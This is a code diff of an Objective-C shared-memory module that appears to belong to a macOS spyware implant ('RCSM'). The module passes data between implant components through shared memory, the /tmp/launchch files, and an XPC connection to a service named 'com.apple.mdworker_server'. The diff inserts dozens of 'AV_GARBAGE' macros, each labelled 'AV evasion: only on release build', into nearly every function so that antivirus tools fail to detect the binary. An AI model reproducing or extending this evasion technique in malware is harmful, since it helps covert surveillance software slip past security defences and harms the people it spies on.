@@ -22,6 +22,8 @@
 #import "RCSMDebug.h"
 #import "RCSMLogger.h"
 
+#import "RCSMAVGarbage.h"
+
 // access permissions on shared memory 0666
 #define GLOBAL_PERMISSIONS 0666
 
@@ -138,7 +140,10 @@ static BOOL resolveXpcFunc()
 static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
 {
   BOOL bRet = FALSE;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if (resolveXpcFunc() == NO) 
     {
 #ifdef DEBUG_SHMEM
@@ -152,7 +157,10 @@ static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
       infoLog(@" xpc function resolved");
 #endif
     }
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   bRet = _sandbox_check(pid, operation, type);
 
 #ifdef  DEBUG_SHMEM
@@ -166,16 +174,28 @@ static BOOL amIPrivileged()
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   BOOL bRet = FALSE;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   if (getuid() == 0 || geteuid() == 0) 
     bRet = TRUE;
   else
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       NSString *appleHID = [[NSString alloc] initWithFormat: @"/Library/ScriptingAdditions/%@", EXT_BUNDLE_FOLDER];
 
       bRet = [[NSFileManager defaultManager] fileExistsAtPath: appleHID];
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       [appleHID release];
     }
   
@@ -226,7 +246,13 @@ static BOOL amIPrivileged()
   if (mAmIPrivUser)
     return;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSString *tmpFileName = [[NSString alloc] initWithFormat: @"/tmp/launchch-%d", mKey];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: tmpFileName] == TRUE)
   {
@@ -237,6 +263,9 @@ static BOOL amIPrivileged()
 - (char *)_guessXPCServiceName: (NSString*)aPath
 {
   char *retString = NULL;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   NSFileManager *localFileManager = [NSFileManager defaultManager];
   NSDirectoryEnumerator *dirEnum  = [localFileManager enumeratorAtPath: aPath];
@@ -250,12 +279,18 @@ static BOOL amIPrivileged()
 #ifdef DEBUG_SHMEM
           //infoLog(@"%s: found xpc service with name %@", __FUNCTION__, _file);
 #endif
-
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+          
           retString = (char*)[_file UTF8String];
 
           retString[strlen(retString) - 4] = 0;
 
-
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
           return retString;
         }
     }
@@ -273,13 +308,22 @@ static BOOL amIPrivileged()
 {
   struct shmid_ds SharedMemDS;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   // if sanboxed do nothing...
   if (amISandboxed)
     return 0;
   if (mAmIPrivUser)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
       if (shmdt(mSharedMemory) != -1)
-        {
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_002
+        
           shmctl([self mSharedMemoryID], IPC_STAT, &SharedMemDS);
 
           // Check if there's anything still attached to the region
@@ -303,21 +347,33 @@ static BOOL amIPrivileged()
         return -1;
     }
   else
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
       munmap(mSharedMemory, mSize);
       close(mSharedMemoryID);
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   return 0;
 }
 
 - (int)attachToMemoryRegion
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   // If sandboxed to nothing...
   if (amISandboxed == NO) 
   { 
     if (mAmIPrivUser)
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       mSharedMemory = shmat(mSharedMemoryID, 0, GLOBAL_PERMISSIONS);
       
       if (mSharedMemory == NULL)
@@ -341,7 +397,14 @@ static BOOL amIPrivileged()
     }
     else
     {
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       mSharedMemory = mmap(NULL, mSize, PROT_READ|PROT_WRITE, MAP_FILE|MAP_SHARED, mSharedMemoryID, 0);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
       
       if (mSharedMemory == NULL)
       {
@@ -353,16 +416,26 @@ static BOOL amIPrivileged()
     infoLog(@"ptrSharedMemory: 0x%08x", mSharedMemory);
 #endif
     
+    // AV evasion: only on release build
+    AV_GARBAGE_009
+    
     mSemaphoreID = sem_open((const char *)mSemaphoreName, 
                             O_CREAT,
                             GLOBAL_PERMISSIONS,
                             1);
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
     
     if ((int *)mSemaphoreID == SEM_FAILED)
     {
 #ifdef DEBUG_SHMEM
       infoLog(@"An error occured while opening semaphore in sem_open()");
 #endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       if (mAmIPrivUser)
         shmdt(mSharedMemory);
       
@@ -370,11 +443,17 @@ static BOOL amIPrivileged()
     } 
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   return 0;
 }
 
 - (int)createMemoryRegion
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   // If sandboxed read shmem by xpc service
   if (amISandboxed) 
   {
@@ -395,6 +474,9 @@ static BOOL amIPrivileged()
 #endif
     }
     
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
     xpc_handler_t handler = (^(xpc_object_t event) 
                              {
                                xpc_type_t type = _xpc_get_type(event);
@@ -407,6 +489,9 @@ static BOOL amIPrivileged()
                                }
                              });
     
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
     mXpcCon = _xpc_connection_create("com.apple.mdworker_server", NULL);
     
     _xpc_connection_set_event_handler(mXpcCon, handler);
@@ -416,9 +501,15 @@ static BOOL amIPrivileged()
     return 0;  
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if (mAmIPrivUser)
   {
     mSharedMemoryID = shmget(mKey, mSize, IPC_CREAT | GLOBAL_PERMISSIONS);
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_007
     
     if (mSharedMemoryID == -1)
     {
@@ -441,9 +532,15 @@ static BOOL amIPrivileged()
     }
   }
   else
-  {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
     // create a tmp file for shmem
     NSString *tmpFileName = [[NSString alloc] initWithFormat: @"/tmp/launchch-%d", mKey];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_007
     
     if ([[NSFileManager defaultManager] fileExistsAtPath: tmpFileName] == FALSE)
     {
@@ -451,6 +548,9 @@ static BOOL amIPrivileged()
       mSharedMemoryID = open([tmpFileName UTF8String], 
                              O_CREAT|O_RDWR, 
                              S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
       
       // create/rewrite the file, mSharedMemory read fail if not
       if (mSharedMemoryID != -1)
@@ -465,7 +565,10 @@ static BOOL amIPrivileged()
                              S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
     
     if (mSharedMemoryID == -1)
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       return -1;
     }
   }
@@ -484,6 +587,9 @@ static BOOL amIPrivileged()
   u_int offset              = 0;
   shMemoryLog *memoryHeader = NULL;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   if (amISandboxed)
     return TRUE;
   
@@ -494,6 +600,9 @@ static BOOL amIPrivileged()
 #endif      
       return FALSE;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   do
     {
@@ -514,6 +623,9 @@ static BOOL amIPrivileged()
     }
   while (offset < mSize);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   return TRUE;
 }
 
@@ -533,7 +645,10 @@ static BOOL amIPrivileged()
 - (BOOL)writeMemorybyXPC: (NSData *)aData
                   offset: (u_int)anOffset
            fromComponent: (u_int)aComponent
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   xpc_object_t reply;
   BOOL bRet = FALSE;
   
@@ -552,6 +667,9 @@ static BOOL amIPrivileged()
 #endif
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   // Write command
   xpc_object_t cmd  = _xpc_int64_create(WRITE_XPC_CMD);
   xpc_object_t off  = _xpc_int64_create(anOffset);
@@ -566,6 +684,9 @@ static BOOL amIPrivileged()
   _xpc_dictionary_set_value(message, "data", data);
   
   reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   if (reply != NULL) 
   {
@@ -609,6 +730,9 @@ static BOOL amIPrivileged()
     }
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   _xpc_release(message);
   
   return bRet;
@@ -618,6 +742,9 @@ static BOOL amIPrivileged()
                     fromComponent:(u_int)aComponent
 {
   NSMutableData *xpcReplyData = nil;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   // reading command
   xpc_object_t cmd = _xpc_int64_create(READ_XPC_CMD);
@@ -632,6 +759,9 @@ static BOOL amIPrivileged()
   
   // blocking send message
   xpc_object_t reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   if (reply != NULL)
   {
@@ -683,6 +813,9 @@ static BOOL amIPrivileged()
     }
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   _xpc_release(message);
   
   return xpcReplyData;
@@ -694,6 +827,9 @@ static BOOL amIPrivileged()
 
 {
   NSMutableData *xpcReplyData = nil;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   // reading command
   xpc_object_t cmd = _xpc_int64_create(READ_XPC_COMP_CMD);
@@ -711,6 +847,9 @@ static BOOL amIPrivileged()
   
   // blocking send message
   xpc_object_t reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   if (reply != NULL)
   {
@@ -752,6 +891,9 @@ static BOOL amIPrivileged()
     }
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   _xpc_release(message);
   
   return xpcReplyData;
@@ -761,6 +903,8 @@ static BOOL amIPrivileged()
                                   forAgent: (u_int)anAgentID
                            withCommandType: (u_int)aCommandType
 {
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   NSMutableData *readData = nil;
   shMemoryLog *tempHeader = NULL;
@@ -784,6 +928,9 @@ static BOOL amIPrivileged()
   
   u_int offset            = 0;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   if (aComponent != COMP_CORE && aComponent != COMP_AGENT)
   {
 #ifdef DEBUG_SHMEM
@@ -792,12 +939,18 @@ static BOOL amIPrivileged()
     return nil;
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if (anAgentID == 0 && aCommandType == 0)
   {
 #ifdef DEBUG_SHMEM
     infoLog(@"[EE] readMemory-log usupported read");
 #endif
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   if (aCommandType != 0)
   {
@@ -810,6 +963,9 @@ static BOOL amIPrivileged()
   
   time_t lowestTimestamp      = 0;
   u_int  matchingObjectOffset = 0;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   //
   // Find the first available block who matches our request
@@ -835,6 +991,9 @@ static BOOL amIPrivileged()
 #endif
     }
     
+    // AV evasion: only on release build
+    AV_GARBAGE_000
+    
     if (lookForCommand == YES)
     {
       if (((aCommandType & tmpCommandType) == tmpCommandType)
@@ -851,6 +1010,9 @@ static BOOL amIPrivileged()
       }
     }
     
+    // AV evasion: only on release build
+    AV_GARBAGE_005
+    
     // Looking only for commandType
     if ((lookForCommand == YES && foundCommand == YES)
         && lookForAgent == NO)
@@ -865,6 +1027,9 @@ static BOOL amIPrivileged()
     if ((lookForCommand  == YES && foundCommand == YES)
         && (lookForAgent == YES && foundAgent   == YES))
       blockFound = YES;
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
     
     if (blockFound == YES)
     {
@@ -889,6 +1054,9 @@ static BOOL amIPrivileged()
       }
     }
     
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
     offset += sizeof (shMemoryLog);
     
     foundCommand = NO;
@@ -900,6 +1068,9 @@ static BOOL amIPrivileged()
   if (blockMatched == YES)
   {
     //infoLog(@"lowest Timestamp: %x", lowestTimestamp);
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_001
     
     if (testPreviousTime != 0)
     {
@@ -913,12 +1084,18 @@ static BOOL amIPrivileged()
       }
     }
     
+    // AV evasion: only on release build
+    AV_GARBAGE_006
+    
     testPreviousTime = lowestTimestamp;
     readData = [[NSMutableData alloc] initWithBytes: (char *)(mSharedMemory + matchingObjectOffset)
                                              length: sizeof(shMemoryLog)];
     
     if (aCommandType != CM_AGENT_CONF)
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       memset((char *)(mSharedMemory + matchingObjectOffset), '\0', sizeof(shMemoryLog));
     }
   }
@@ -929,12 +1106,18 @@ static BOOL amIPrivileged()
     return nil;
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   return readData;
 }
 
 - (NSMutableData *)readMemory: (u_int)anOffset
                 fromComponent: (u_int)aComponent
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSMutableData *readData = nil;
   
   // if sandboxed read shmem by xpc api
@@ -946,6 +1129,9 @@ static BOOL amIPrivileged()
     return [readData autorelease];
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   shMemoryCommand *memoryHeader = (shMemoryCommand *)(mSharedMemory + anOffset);
   
   if (aComponent != COMP_CORE && aComponent != COMP_AGENT)
@@ -956,6 +1142,9 @@ static BOOL amIPrivileged()
     return nil;
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if (anOffset == 0)
   {
 #ifdef DEBUG_SHMEM
@@ -963,6 +1152,9 @@ static BOOL amIPrivileged()
 #endif
     return nil;
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   if (memoryHeader->agentID != 0)
   {
@@ -975,6 +1167,10 @@ static BOOL amIPrivileged()
 #ifdef DEBUG_SHMEM
       infoLog(@"Found data on shared memory");
 #endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       readData = [[NSMutableData alloc] initWithBytes: mSharedMemory + anOffset
                                                length: sizeof(shMemoryCommand)];
       
@@ -991,6 +1187,9 @@ static BOOL amIPrivileged()
 {
   int memoryState = 0;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   // Do it by xpc service
   if (amISandboxed) 
     return [self writeMemorybyXPC:aData offset:anOffset fromComponent:aComponent];
@@ -1003,6 +1202,9 @@ static BOOL amIPrivileged()
   {
     if (anOffset == 1)
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       [self zeroFillMemory];
       anOffset = 0;
     }
@@ -1033,6 +1235,9 @@ static BOOL amIPrivileged()
     }
     while (memoryState != SHMEM_FREE);
     
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
     memcpy((void *)(mSharedMemory + anOffset), [aData bytes], sizeof(shMemoryLog));
     
     [self _unlockShmem];
@@ -1042,6 +1247,9 @@ static BOOL amIPrivileged()
     //memoryState = *(unsigned int *)(mSharedMemory + anOffset);
     
     [self _lockShmem];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_005
     
     memcpy((void *)(mSharedMemory + anOffset), [aData bytes], sizeof(shMemoryCommand));
     
